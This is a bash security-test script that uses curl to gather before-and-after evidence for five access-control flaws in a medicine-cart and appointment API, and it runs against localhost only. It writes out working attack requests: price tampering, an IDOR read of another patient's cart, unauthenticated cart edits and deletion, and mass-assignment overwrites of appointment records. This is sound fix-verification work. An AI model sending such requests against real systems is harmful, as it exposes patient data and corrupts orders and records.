#!/usr/bin/env bash
# Real curl evidence for V-11 to V-15 (Samadinee — pricing, cart and appointment access control).
#
# Every request below is sent by the curl binary itself, and the terminal output is saved
# unedited. Commands are printed with $VARIABLES (not pasted tokens) so anyone can re-run them.
#
# Start the disposable server first, in another terminal:
#
#     cd backend && npm run dev:test
#
# Then, from the repo root (Git Bash):
#
#     bash security-tests/curl-v11-v15.sh            -> writes before-curl.txt in each folder
#     bash security-tests/curl-v11-v15.sh --after    -> writes after-curl.txt in each folder
#
# Restart the dev server before every run: the attacks change the seeded data.
# Order matters for the same reason — reads run before the writes that would spoil them.
# Localhost only. /payment/checkout is never called: it crashes the server (V-06).

set -u
cd "$(dirname "$0")/.."

MODE=before
[ "${1:-}" = "--after" ] && MODE=after

if [ ! -f security-tests/.tokens.json ]; then
    echo "Could not read security-tests/.tokens.json — start the server: cd backend && npm run dev:test"
    exit 1
fi

# Read a value out of .tokens.json (no jq on most Windows machines, node is always there).
tok() { node -p "const t=require('./security-tests/.tokens.json'); $1"; }

BASE=$(tok "t.baseUrl")
DANA=$(tok "t.accounts.dana.cookie");   DANA_ID=$(tok "t.accounts.dana.id")
BOBBY=$(tok "t.accounts.bobby.cookie"); BOBBY_ID=$(tok "t.accounts.bobby.id")
ALPHA=$(tok "t.accounts.alpha.cookie"); ALPHA_ID=$(tok "t.accounts.alpha.id")
BETA_ID=$(tok "t.accounts.beta.id")
MED1=$(tok "t.ids.medicineId")
CART_ID=$(tok "t.ids.cartId")
APPT_ID=$(tok "t.ids.appointmentId")

case "$BASE" in
    http://localhost:*|http://127.0.0.1:*) ;;
    *) echo "Refusing to run: target $BASE is not localhost"; exit 1 ;;
esac

# Print the command exactly as written, then run it and print curl's raw output.
run() {
    echo "\$ $1"
    eval "$1" 2>&1 | tr -d '\r'
    echo
    echo
}

header() {
    echo "$1"
    printf '=%.0s' $(seq 1 ${#1}); echo
    echo
    echo "state    : ${MODE^^} the fix"
    echo "captured : $(date -u +%Y-%m-%dT%H:%M:%SZ)"
    echo "branch   : $(git rev-parse --abbrev-ref HEAD)"
    echo "commit   : $(git rev-parse --short HEAD)"
    echo "tool     : $(curl --version | head -1 | cut -d' ' -f1-2)  (real curl, output unedited)"
    echo "target   : $BASE  (disposable in-memory database, localhost only)"
    echo
    echo "Variables used below (values come from security-tests/.tokens.json):"
    echo "  DANA=patientToken=<dana's JWT>    DANA_ID=$DANA_ID"
    echo "  BOBBY=patientToken=<bobby's JWT>  BOBBY_ID=$BOBBY_ID"
    echo "  ALPHA=doctorToken=<Dr Alpha's JWT>  ALPHA_ID=$ALPHA_ID   (Dr Beta's id: $BETA_ID)"
    echo "  MED1=$MED1  MED2=${MED2:-}  CART_ID=$CART_ID  APPT_ID=$APPT_ID"
    echo
    echo "------------------------------------------------------------------------------"
}

save() { tee "security-tests/$1/$MODE-curl.txt" > /dev/null; echo "  wrote security-tests/$1/$MODE-curl.txt"; }

mkdir -p security-tests/v11-client-side-price security-tests/v12-cart-no-auth security-tests/v13-cart-idor \
         security-tests/v14-appointment-mass-assignment security-tests/v15-doctor-sees-all-appointments

# A second medicine for V-12, so its cart toggle does not collide with Bobby's seeded row.
MED2=$(curl -s "$BASE/api/v1/medicines/search-medicine?search=Testomycin%20002" \
       | node -e "let s='';process.stdin.on('data',d=>s+=d).on('end',()=>console.log(JSON.parse(s).data[0]._id))")

# --- V-11 ---------------------------------------------------------------------
{
    header "V-11 The client decides the price and the server stores it"
    echo "STEP 1 — the real price of the medicine, from the server"
    run 'curl -s "$BASE/api/v1/medicines/get/$MED1"'
    echo "STEP 2 — logged in as Dana, add 99 of it to her cart with totalPrice 1"
    run 'curl -s -i -X POST "$BASE/api/v1/medicines-cart/add-to-cart" -H "Cookie: $DANA" -H "Content-Type: application/json" -d "{\"userId\":\"$DANA_ID\",\"medicineId\":\"$MED1\",\"quantity\":99,\"totalPrice\":1,\"status\":\"Pending\"}"'
    echo "Compare \"price\" in step 1 with \"totalPrice\" stored in step 2 (99 x price is the honest total)."
    echo "/payment/checkout is not called: it crashes the whole server (V-06)."
} | save v11-client-side-price

# --- V-13 (before V-12, which deletes Bobby's seeded row) ---------------------
{
    header "V-13 IDOR: one patient can read another patient's cart"
    echo "CONTROL — Dana reads her own cart"
    run 'curl -s -i "$BASE/api/v1/medicines-cart/user-cart/$DANA_ID" -H "Cookie: $DANA"'
    echo "ATTACK — Dana, with her own cookie, asks for Bobby's cart"
    run 'curl -s -i "$BASE/api/v1/medicines-cart/user-cart/$BOBBY_ID" -H "Cookie: $DANA"'
    echo "Every row returned in the attack has \"userId\":\"$BOBBY_ID\" — Bobby's data, sent to Dana."
} | save v13-cart-idor

# --- V-12 ---------------------------------------------------------------------
{
    header "V-12 Two of the three cart routes have no login check"
    echo "CONTROL — the one guarded route, no cookie"
    run 'curl -s -i "$BASE/api/v1/medicines-cart/user-cart/$BOBBY_ID"'
    echo "ATTACK 1 — add an item to Bobby's cart, NO cookie"
    run 'curl -s -i -X POST "$BASE/api/v1/medicines-cart/add-to-cart" -H "Content-Type: application/json" -d "{\"userId\":\"$BOBBY_ID\",\"medicineId\":\"$MED2\",\"quantity\":5,\"totalPrice\":500,\"status\":\"Pending\"}"'
    echo "ATTACK 2 — delete Bobby's seeded cart row, NO cookie"
    run 'curl -s -i -X DELETE "$BASE/api/v1/medicines-cart/delete-from-cart/$CART_ID"'
    echo "CONFIRM — Bobby logs in and looks at his own cart"
    run 'curl -s -i "$BASE/api/v1/medicines-cart/user-cart/$BOBBY_ID" -H "Cookie: $BOBBY"'
    echo "Seeded row $CART_ID is gone, and the row for $MED2 was planted — both with no login."
} | save v12-cart-no-auth

# --- V-15 (before V-14, which overwrites the appointment) ---------------------
{
    header "V-15 Every doctor can read every patient's appointments"
    echo "Dr Alpha asks for the appointment list. The only seeded appointment is Alice's, with Dr Beta."
    run 'curl -s -i "$BASE/api/v1/appointment/getall" -H "Cookie: $ALPHA"'
    echo "Dr Alpha is not the doctor on this appointment, yet receives the patient's name, city,"
    echo "pincode, date and department."
} | save v15-doctor-sees-all-appointments

# --- V-14 ---------------------------------------------------------------------
{
    header "V-14 Any doctor can rewrite any field of any appointment"
    echo "Seeded values: patientFirstName \"Alice\", appointmentCharges \"3000\", city \"Kandy\","
    echo "department \"Oncology\", status \"Pending\", doctor = Dr Beta."
    echo
    echo "Dr Alpha updates Dr Beta's appointment, sending fields other than status:"
    run 'curl -s -i -X PUT "$BASE/api/v1/appointment/update/$APPT_ID" -H "Cookie: $ALPHA" -H "Content-Type: application/json" -d "{\"status\":\"Accepted\",\"appointmentCharges\":\"1\",\"city\":\"HACKED\",\"department\":\"HACKED-DEPT\",\"patientFirstName\":\"Overwritten\"}"'
    echo "Every submitted field is in the stored document, on an appointment that belongs to another doctor."
} | save v14-appointment-mass-assignment
